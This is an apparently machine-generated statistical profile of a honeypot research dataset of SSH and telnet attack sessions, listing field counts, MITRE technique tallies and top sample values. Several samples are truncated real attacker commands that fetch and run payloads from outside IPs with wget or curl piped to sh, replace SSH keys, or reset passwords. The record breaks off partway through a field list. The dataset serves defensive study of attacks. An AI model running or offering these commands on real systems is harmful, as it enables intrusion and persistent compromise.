@@ -1,0 +1,4188 @@
+{
+ "dataset": "shell_attack_evolution",
+ "title": "Shell Attack Evolution Dataset (SRDS 2025)",
+ "status": "downloaded",
+ "source": "GitHub zyw-286/shell-attack-evolution-dataset, branch main, commit d5f7fe120ebd921e04026b6348c3ec5d399c5df6",
+ "seconds": 92,
+ "archives": 1,
+ "files": 300,
+ "bytes": 1830448298,
+ "lines": 5638177,
+ "binary": 0,
+ "bad_utf8": 0,
+ "read_errors": 0,
+ "technique_mentions": 108213,
+ "technique_ids": 34,
+ "parent_techniques": 34,
+ "file_groups": 65,
+ "inputs": [
+  {
+   "name": "shell-attack-evolution-dataset-main.zip",
+   "size": 91565080,
+   "download": "downloaded",
+   "checksum": "none published; sha256 8d3ae305b0570f7a156c7544894cb2198b4ce7a218c80263ad52f4a299896b5d"
+  }
+ ],
+ "blocked_files": 0,
+ "techniques": {
+  "T1059": 18970,
+  "T1098": 17676,
+  "T1082": 16470,
+  "T1222": 13474,
+  "T1087": 8613,
+  "T1070": 8308,
+  "T1083": 6640,
+  "T1005": 4095,
+  "T1053": 3972,
+  "T1057": 3935,
+  "T1105": 2029,
+  "T1036": 1571,
+  "T1562": 741,
+  "T1027": 493,
+  "T1016": 490,
+  "T1424": 234,
+  "T1548": 122,
+  "T1489": 74,
+  "T1564": 68,
+  "T1037": 46,
+  "T1655": 30,
+  "T1124": 28,
+  "T1531": 25,
+  "T1518": 21,
+  "T1003": 16,
+  "T1120": 14,
+  "T1071": 14,
+  "T1069": 14,
+  "T1590": 8,
+  "T1033": 7,
+  "T1474": 6,
+  "T1614": 3,
+  "T1547": 3,
+  "T1496": 3
+ },
+ "problems": [],
+ "groups": {
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/#/cowrie/ssh_#_#.json": {
+   "files": 118,
+   "bytes": 1700343525,
+   "lines": 5290884,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 5290884,
+   "parsed": 5290884,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/2024/cowrie/ssh_03_01.json",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "info": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": 8,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "command.process",
+       1002871
+      ],
+      [
+       "session.connect",
+       891966
+      ],
+      [
+       "session.closed",
+       891963
+      ],
+      [
+       "session.kex",
+       807529
+      ],
+      [
+       "userlogin",
+       775405
+      ],
+      [
+       "command.input",
+       519462
+      ],
+      [
+       "session.loseConnection",
+       312233
+      ],
+      [
+       "command.failed",
+       89455
+      ]
+     ]
+    },
+    "alert": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": 3,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Initial Access",
+       2903691
+      ],
+      [
+       "Execution",
+       1611788
+      ],
+      [
+       "Credential Access",
+       775405
+      ]
+     ]
+    },
+    "tshark": {
+     "filled": 5290845,
+     "seen": 5290884,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Timeout reached in HoneyPotSSHTransport",
+       151
+      ],
+      [
+       "SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a",
+       148
+      ],
+      [
+       "command  found [ b'uname -s -v -n -r -m ']",
+       144
+      ],
+      [
+       "SSH client hassh fingerprint: 1616c6d18e845e7a01168a44591f7a35",
+       4
+      ],
+      [
+       "[SERVER] - Disconnecting with error, code11  reason: b''",
+       4
+      ],
+      [
+       "login attempt [b'b1LogUser'/b'b1LogUser'] succeeded",
+       1
+      ],
+      [
+       "New connection: 167.99.215.167:34812 (172.17.0.2:22) [session: 04e70cad431a]",
+       1
+      ],
+      [
+       "login attempt [b'erpnext'/b'erpnext'] succeeded",
+       1
+      ]
+     ]
+    },
+    "src_host": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "170.64.175.16",
+       33044
+      ],
+      [
+       "170.64.187.220",
+       4164
+      ],
+      [
+       "170.64.192.247",
+       3544
+      ],
+      [
+       "170.64.148.44",
+       3113
+      ],
+      [
+       "24.199.92.137",
+       2966
+      ],
+      [
+       "170.64.173.251",
+       2786
+      ],
+      [
+       "167.99.215.167",
+       2655
+      ],
+      [
+       "104.248.8.224",
+       2375
+      ]
+     ]
+    },
+    "src_port": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "12121",
+       24
+      ],
+      [
+       "46240",
+       7
+      ],
+      [
+       "49316",
+       6
+      ],
+      [
+       "36406",
+       6
+      ],
+      [
+       "34812",
+       5
+      ],
+      [
+       "47578",
+       5
+      ],
+      [
+       "46454",
+       5
+      ],
+      [
+       "45330",
+       5
+      ]
+     ]
+    },
+    "dst_host": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "104.238.182.124",
+       5290884
+      ]
+     ]
+    },
+    "dst_port": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "22",
+       5290884
+      ]
+     ]
+    },
+    "protocol": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "ssh",
+       5290884
+      ]
+     ]
+    },
+    "pot_id": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "ssh",
+       5290884
+      ]
+     ]
+    },
+    "request": {
+     "filled": 0,
+     "seen": 5290884,
+     "distinct": 0,
+     "with_attack_ids": 0,
+     "top": []
+    },
+    "timestamp": {
+     "filled": 5290884,
+     "seen": 5290884,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024-03-01 00:00:00.010921",
+       1
+      ],
+      [
+       "2024-03-01 00:00:00.551845",
+       1
+      ],
+      [
+       "2024-03-01 00:00:03.635933",
+       1
+      ],
+      [
+       "2024-03-01 00:00:03.812741",
+       1
+      ],
+      [
+       "2024-03-01 00:00:05.184070",
+       1
+      ],
+      [
+       "2024-03-01 00:00:05.327389",
+       1
+      ],
+      [
+       "2024-03-01 00:00:05.800505",
+       1
+      ],
+      [
+       "2024-03-01 00:00:07.783105",
+       1
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/#/cowrie/telnet_#_#.json": {
+   "files": 118,
+   "bytes": 90405055,
+   "lines": 307744,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 307744,
+   "parsed": 307744,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/2024/cowrie/telnet_03_01.json",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "info": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": 4,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "command.process",
+       140826
+      ],
+      [
+       "command.input",
+       97888
+      ],
+      [
+       "command.failed",
+       41939
+      ],
+      [
+       "userlogin",
+       27091
+      ]
+     ]
+    },
+    "alert": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Execution",
+       280653
+      ],
+      [
+       "Credential Access",
+       27091
+      ]
+     ]
+    },
+    "tshark": {
+     "filled": 305546,
+     "seen": 307744,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "command  found [ b'sh  ']",
+       306
+      ],
+      [
+       "enable",
+       166
+      ],
+      [
+       "command  found [ b'enable  ']",
+       166
+      ],
+      [
+       "system",
+       166
+      ],
+      [
+       "shell",
+       166
+      ],
+      [
+       "sh",
+       166
+      ],
+      [
+       "command  found [ b'ping  ']",
+       140
+      ],
+      [
+       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
+       140
+      ]
+     ]
+    },
+    "src_host": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "110.180.168.249",
+       831
+      ],
+      [
+       "114.32.34.235",
+       640
+      ],
+      [
+       "61.219.51.200",
+       640
+      ],
+      [
+       "114.32.126.55",
+       640
+      ],
+      [
+       "125.229.44.99",
+       640
+      ],
+      [
+       "220.135.95.196",
+       556
+      ],
+      [
+       "8.135.116.219",
+       546
+      ],
+      [
+       "61.156.26.234",
+       522
+      ]
+     ]
+    },
+    "src_port": {
+     "filled": 307743,
+     "seen": 307744,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "53715",
+       30
+      ],
+      [
+       "33569",
+       30
+      ],
+      [
+       "34942",
+       30
+      ],
+      [
+       "36304",
+       30
+      ],
+      [
+       "38835",
+       29
+      ],
+      [
+       "58563",
+       29
+      ],
+      [
+       "40780",
+       29
+      ],
+      [
+       "53128",
+       29
+      ]
+     ]
+    },
+    "dst_host": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "104.238.182.124",
+       307744
+      ]
+     ]
+    },
+    "dst_port": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "23",
+       307744
+      ]
+     ]
+    },
+    "protocol": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "telnet",
+       307744
+      ]
+     ]
+    },
+    "pot_id": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "ssh",
+       307744
+      ]
+     ]
+    },
+    "request": {
+     "filled": 0,
+     "seen": 307744,
+     "distinct": 0,
+     "with_attack_ids": 0,
+     "top": []
+    },
+    "timestamp": {
+     "filled": 307744,
+     "seen": 307744,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024-03-01 16:43:02.222970",
+       1
+      ],
+      [
+       "2024-03-01 16:50:47.583353",
+       1
+      ],
+      [
+       "2024-03-01 16:50:49.045123",
+       1
+      ],
+      [
+       "2024-03-01 16:50:49.047197",
+       1
+      ],
+      [
+       "2024-03-01 16:50:49.048774",
+       1
+      ],
+      [
+       "2024-03-01 16:50:49.051385",
+       1
+      ],
+      [
+       "2024-03-01 16:50:49.053570",
+       1
+      ],
+      [
+       "2024-03-01 16:50:49.054404",
+       1
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/request_response/vm_replay_#_#.jsonl": {
+   "files": 1,
+   "bytes": 18314272,
+   "lines": 1512,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 1512,
+   "parsed": 1512,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/request_response/vm_replay_2021_2022.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "session_id": {
+     "filled": 1512,
+     "seen": 1512,
+     "distinct": 160,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "f65d8a9aa5af",
+       353
+      ],
+      [
+       "21dae9a5de5b",
+       136
+      ],
+      [
+       "f1cdcd039d60",
+       40
+      ],
+      [
+       "8174d7ecb2bf",
+       38
+      ],
+      [
+       "79a0ec5c3fcc",
+       32
+      ],
+      [
+       "b0381833b4d2",
+       28
+      ],
+      [
+       "196a54d64e78",
+       28
+      ],
+      [
+       "e3ac6ad7fdae",
+       28
+      ]
+     ]
+    },
+    "period": {
+     "filled": 1512,
+     "seen": 1512,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2021_2022",
+       1512
+      ]
+     ]
+    },
+    "turn_index": {
+     "filled": 1512,
+     "seen": 1512,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0",
+       122
+      ],
+      [
+       "1",
+       72
+      ],
+      [
+       "2",
+       58
+      ],
+      [
+       "3",
+       54
+      ],
+      [
+       "4",
+       48
+      ],
+      [
+       "5",
+       46
+      ],
+      [
+       "6",
+       44
+      ],
+      [
+       "7",
+       40
+      ]
+     ]
+    },
+    "command": {
+     "filled": 1489,
+     "seen": 1512,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "sh",
+       25
+      ],
+      [
+       "cat /proc/cpuinfo | grep name | wc -l",
+       22
+      ],
+      [
+       "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+       22
+      ],
+      [
+       "w",
+       22
+      ],
+      [
+       "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+       21
+      ],
+      [
+       "ls -lh $(which ls)",
+       21
+      ],
+      [
+       "which ls",
+       21
+      ],
+      [
+       "crontab -l",
+       21
+      ]
+     ]
+    },
+    "response": {
+     "filled": 1508,
+     "seen": 1512,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "# ",
+       375
+      ],
+      [
+       "bpnhz\r\nroot@wzy-VirtualBox:/tmp# ",
+       122
+      ],
+      [
+       "1\r\nroot@wzy-VirtualBox:~# ",
+       50
+      ],
+      [
+       "root@wzy-VirtualBox:~# ",
+       45
+      ],
+      [
+       "\\x4f\\x4e\\x45'\r\nECHODONE\r\nroot@wzy-VirtualBox:/usr# ",
+       40
+      ],
+      [
+       "'\r\nIntel(R) Core(TM) i7-10850H CPU @ 2.70GHz\r\nroot@wzy-VirtualBox:~# ",
+       29
+      ],
+      [
+       "\u001b[A\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[C\u001b[",
+       28
+      ],
+      [
+       "-rwxr-xr-x 1 root root 131K 1月  18  2018 \u001b[0m\u001b[01;32m/bin/ls\u001b[0m\r\nroot@wzy-Virtu",
+       27
+      ]
+     ]
+    },
+    "system_change": {
+     "filled": 0,
+     "seen": 1512,
+     "distinct": 0,
+     "with_attack_ids": 0,
+     "top": []
+    },
+    "severity_vi": {
+     "filled": 0,
+     "seen": 1512,
+     "distinct": 0,
+     "with_attack_ids": 0,
+     "top": []
+    },
+    "response_source": {
+     "filled": 1512,
+     "seen": 1512,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "real_vm",
+       1512
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/sessions/#_#.jsonl": {
+   "files": 1,
+   "bytes": 8602471,
+   "lines": 5365,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 5365,
+   "parsed": 5365,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/sessions/2021_2022.jsonl",
+   "note": "",
+   "techniques": {
+    "T1059": 14104,
+    "T1082": 13501,
+    "T1098": 11390,
+    "T1087": 6489,
+    "T1083": 4527,
+    "T1005": 3983,
+    "T1222": 3280,
+    "T1053": 3219,
+    "T1057": 3179,
+    "T1105": 1187,
+    "T1070": 1030,
+    "T1036": 924,
+    "T1027": 282,
+    "T1548": 97,
+    "T1016": 48,
+    "T1424": 41,
+    "T1037": 39,
+    "T1489": 12,
+    "T1124": 7,
+    "T1655": 4,
+    "T1564": 3,
+    "T1531": 2,
+    "T1518": 2,
+    "T1120": 1
+   },
+   "technique_mentions_per_file": "min 67351, median 67351, max 67351",
+   "fields": {
+    "session_id": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "92bcbc73f653",
+       1
+      ],
+      [
+       "360bdcf2bafe",
+       1
+      ],
+      [
+       "d9320f7189af",
+       1
+      ],
+      [
+       "70988f008f00",
+       1
+      ],
+      [
+       "ce3ecf16cc10",
+       1
+      ],
+      [
+       "4db1ca5db87f",
+       1
+      ],
+      [
+       "95124438d743",
+       1
+      ],
+      [
+       "8f0f80000af3",
+       1
+      ]
+     ]
+    },
+    "period": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2021_2022",
+       5365
+      ]
+     ]
+    },
+    "src_ip": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "34.72.48.24",
+       1
+      ],
+      [
+       "176.227.123.75",
+       1
+      ],
+      [
+       "193.242.149.32",
+       1
+      ],
+      [
+       "190.133.209.86",
+       1
+      ],
+      [
+       "212.76.254.252",
+       1
+      ],
+      [
+       "88.214.16.174",
+       1
+      ],
+      [
+       "65.34.193.250",
+       1
+      ],
+      [
+       "179.43.176.42",
+       1
+      ]
+     ]
+    },
+    "commands[]": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": 113,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "list of 17",
+       1204
+      ],
+      [
+       "[\"echo -e '\\\\x67\\\\x61\\\\x79\\\\x66\\\\x67\\\\x74'\"]",
+       830
+      ],
+      [
+       "list of 10",
+       723
+      ],
+      [
+       "list of 15",
+       653
+      ],
+      [
+       "list of 19",
+       457
+      ],
+      [
+       "list of 18",
+       216
+      ],
+      [
+       "list of 21",
+       192
+      ],
+      [
+       "list of 16",
+       163
+      ]
+     ]
+    },
+    "command_count": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": 36,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "17",
+       1204
+      ],
+      [
+       "1",
+       991
+      ],
+      [
+       "10",
+       723
+      ],
+      [
+       "15",
+       653
+      ],
+      [
+       "19",
+       457
+      ],
+      [
+       "18",
+       216
+      ],
+      [
+       "21",
+       192
+      ],
+      [
+       "16",
+       163
+      ]
+     ]
+    },
+    "session_pattern": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": 110,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "('cat | grep | wc -l', 'echo -e | passwd | bash', 'Enter', 'echo | passwd', 'cat",
+       2277
+      ],
+      [
+       "('cat | grep | wc -l', 'echo | chpasswd | bash', 'cat | grep | head -n | awk { p",
+       917
+      ],
+      [
+       "('echo',)",
+       838
+      ],
+      [
+       "('enable', 'system', 'shell', 'sh', 'cat ; /bin/busybox', 'cd ; cat || cp ; /bin",
+       746
+      ],
+      [
+       "('sh', 'enable', 'shell', 'debug', 'cmd', 'wget -O- | sh ; curl -O- | sh')",
+       141
+      ],
+      [
+       "('start', 'enable', 'config', 'system', 'linuxshell', 'su', 'shell', 'sh', 'cd |",
+       95
+      ],
+      [
+       "('/system',)",
+       39
+      ],
+      [
+       "('/ip', 'ifconfig', 'uname', 'cat', 'ps | grep [ ]', 'ps -ef | grep [ ]', 'ls', ",
+       35
+      ]
+     ]
+    },
+    "attack_techniques[]": {
+     "filled": 5365,
+     "seen": 5365,
+     "distinct": 61,
+     "with_attack_ids": 1132,
+     "top": [
+      [
+       "list of 16",
+       1168
+      ],
+      [
+       "[\"T1059 Command and Scripting Interpreter\"]",
+       845
+      ],
+      [
+       "list of 11",
+       731
+      ],
+      [
+       "list of 15",
+       712
+      ],
+      [
+       "list of 19",
+       439
+      ],
+      [
+       "list of 18",
+       216
+      ],
+      [
+       "list of 21",
+       184
+      ],
+      [
+       "[\"T1059 Command and Scripting Interpreter\", \"T1105 Ingress Tool Transfer\", \"T105",
+       147
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/sessions/#.jsonl": {
+   "files": 1,
+   "bytes": 7200297,
+   "lines": 6658,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 6658,
+   "parsed": 6658,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/sessions/2024.jsonl",
+   "note": "",
+   "techniques": {
+    "T1222": 9983,
+    "T1070": 7088,
+    "T1098": 6233,
+    "T1059": 4534,
+    "T1082": 2861,
+    "T1087": 2080,
+    "T1083": 1937,
+    "T1057": 738,
+    "T1562": 733,
+    "T1053": 731,
+    "T1105": 630,
+    "T1036": 621,
+    "T1016": 421,
+    "T1424": 159,
+    "T1027": 97,
+    "T1005": 73,
+    "T1564": 49,
+    "T1489": 28,
+    "T1069": 8,
+    "T1003": 8,
+    "T1548": 7,
+    "T1071": 4,
+    "T1590": 3,
+    "T1033": 1
+   },
+   "technique_mentions_per_file": "min 39027, median 39027, max 39027",
+   "fields": {
+    "session_id": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "03d51db6da14",
+       1
+      ],
+      [
+       "c8cd6d0aed87",
+       1
+      ],
+      [
+       "465fa44af227",
+       1
+      ],
+      [
+       "b614e210ce4a",
+       1
+      ],
+      [
+       "bdef6e7047ce",
+       1
+      ],
+      [
+       "4cfe4caf1581",
+       1
+      ],
+      [
+       "3f6912148625",
+       1
+      ],
+      [
+       "b78e29dc06a5",
+       1
+      ]
+     ]
+    },
+    "period": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024",
+       6658
+      ]
+     ]
+    },
+    "src_ip": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "170.64.148.44",
+       1
+      ],
+      [
+       "167.99.215.167",
+       1
+      ],
+      [
+       "104.248.8.224",
+       1
+      ],
+      [
+       "185.196.8.151",
+       1
+      ],
+      [
+       "122.116.57.36",
+       1
+      ],
+      [
+       "221.159.243.96",
+       1
+      ],
+      [
+       "172.17.0.1",
+       1
+      ],
+      [
+       "220.123.122.176",
+       1
+      ]
+     ]
+    },
+    "commands[]": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": 109,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "[\"cd ~; chattr -ia .ssh; lockr -ia .ssh\", \"cd ~ && rm -rf .ssh && mkdir .ssh && ",
+       4179
+      ],
+      [
+       "list of 10",
+       512
+      ],
+      [
+       "list of 19",
+       397
+      ],
+      [
+       "[\"uname -s -m\"]",
+       244
+      ],
+      [
+       "list of 7",
+       233
+      ],
+      [
+       "list of 8",
+       184
+      ],
+      [
+       "[\"./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done",
+       153
+      ],
+      [
+       "list of 20",
+       147
+      ]
+     ]
+    },
+    "command_count": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": 32,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2",
+       4164
+      ],
+      [
+       "1",
+       656
+      ],
+      [
+       "10",
+       512
+      ],
+      [
+       "19",
+       397
+      ],
+      [
+       "7",
+       233
+      ],
+      [
+       "8",
+       184
+      ],
+      [
+       "20",
+       147
+      ],
+      [
+       "21",
+       69
+      ]
+     ]
+    },
+    "session_pattern": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": 82,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "('cd ; chattr -ia ; lockr -ia', 'cd && rm -rf && mkdir && echo >> && chmod -R &&",
+       4909
+      ],
+      [
+       "('enable', 'system', 'shell', 'sh', 'cat ; /bin/busybox', 'cd ; cat || cp ; /bin",
+       528
+      ],
+      [
+       "('uname',)",
+       402
+      ],
+      [
+       "('sh', 'shell', 'enable', 'system', 'ping ; sh', 'nan', '/bin/busybox cat || cat",
+       229
+      ],
+      [
+       "('/ip', 'ifconfig', 'uname', 'cat', 'ps | grep [ ]', 'ps -ef | grep [ ]', 'ls', ",
+       153
+      ],
+      [
+       "('./ ; dd if || while ; do echo ; done || cat ;',)",
+       153
+      ],
+      [
+       "('echo && cat', 'nohup -c -o ; if if [ ! -f ] ; then wget -O ; fi ; if if [ ! -f",
+       66
+      ],
+      [
+       "('chmod +x ./ ; nohup ./ &',)",
+       35
+      ]
+     ]
+    },
+    "attack_techniques[]": {
+     "filled": 6658,
+     "seen": 6658,
+     "distinct": 50,
+     "with_attack_ids": 566,
+     "top": [
+      [
+       "list of 4",
+       4399
+      ],
+      [
+       "list of 9",
+       514
+      ],
+      [
+       "list of 17",
+       423
+      ],
+      [
+       "[\"T1087 Account Discovery\"]",
+       403
+      ],
+      [
+       "list of 6",
+       180
+      ],
+      [
+       "[]",
+       163
+      ],
+      [
+       "list of 19",
+       140
+      ],
+      [
+       "list of 21",
+       60
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/commands/#_#.jsonl": {
+   "files": 1,
+   "bytes": 2441689,
+   "lines": 12923,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 12923,
+   "parsed": 12923,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/commands/2021_2022.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "command": {
+     "filled": 12923,
+     "seen": 12923,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q h",
+       6
+      ],
+      [
+       "cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /; wge",
+       3
+      ],
+      [
+       "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.58.203/ssh |",
+       2
+      ],
+      [
+       "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl",
+       2
+      ],
+      [
+       "cat /proc/cpuinfo | grep name | wc -l",
+       1
+      ],
+      [
+       "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+       1
+      ],
+      [
+       "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+       1
+      ],
+      [
+       "w",
+       1
+      ]
+     ]
+    },
+    "period": {
+     "filled": 12923,
+     "seen": 12923,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2021_2022",
+       12923
+      ]
+     ]
+    },
+    "frequency": {
+     "filled": 12923,
+     "seen": 12923,
+     "distinct": 41,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "1",
+       12720
+      ],
+      [
+       "2",
+       124
+      ],
+      [
+       "4",
+       13
+      ],
+      [
+       "3",
+       9
+      ],
+      [
+       "11",
+       5
+      ],
+      [
+       "5",
+       5
+      ],
+      [
+       "3219",
+       3
+      ],
+      [
+       "147",
+       3
+      ]
+     ]
+    },
+    "is_complex": {
+     "filled": 12923,
+     "seen": 12923,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "True",
+       11939
+      ],
+      [
+       "False",
+       984
+      ]
+     ]
+    },
+    "command_pattern": {
+     "filled": 11941,
+     "seen": 12923,
+     "distinct": 143,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "echo -e | passwd | bash",
+       3676
+      ],
+      [
+       "echo | passwd",
+       3672
+      ],
+      [
+       "echo | chpasswd | bash",
+       1548
+      ],
+      [
+       "cat ; /bin/busybox",
+       767
+      ],
+      [
+       "cd ; cat || cp ; /bin/busybox",
+       767
+      ],
+      [
+       "tftp ; wget ; /bin/busybox",
+       767
+      ],
+      [
+       "echo -ne >>",
+       306
+      ],
+      [
+       "echo -ne >> ./",
+       121
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/request_response/curated.jsonl": {
+   "files": 1,
+   "bytes": 1418468,
+   "lines": 1489,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 1489,
+   "parsed": 1489,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/request_response/curated.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "session_id": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": 160,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "f65d8a9aa5af",
+       352
+      ],
+      [
+       "21dae9a5de5b",
+       136
+      ],
+      [
+       "f1cdcd039d60",
+       40
+      ],
+      [
+       "8174d7ecb2bf",
+       38
+      ],
+      [
+       "79a0ec5c3fcc",
+       30
+      ],
+      [
+       "b0381833b4d2",
+       28
+      ],
+      [
+       "196a54d64e78",
+       28
+      ],
+      [
+       "7affc0047e9f",
+       27
+      ]
+     ]
+    },
+    "period": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2021_2022",
+       1489
+      ]
+     ]
+    },
+    "turn_index": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0",
+       122
+      ],
+      [
+       "1",
+       72
+      ],
+      [
+       "2",
+       58
+      ],
+      [
+       "3",
+       54
+      ],
+      [
+       "4",
+       48
+      ],
+      [
+       "5",
+       46
+      ],
+      [
+       "6",
+       43
+      ],
+      [
+       "7",
+       39
+      ]
+     ]
+    },
+    "command": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "sh",
+       25
+      ],
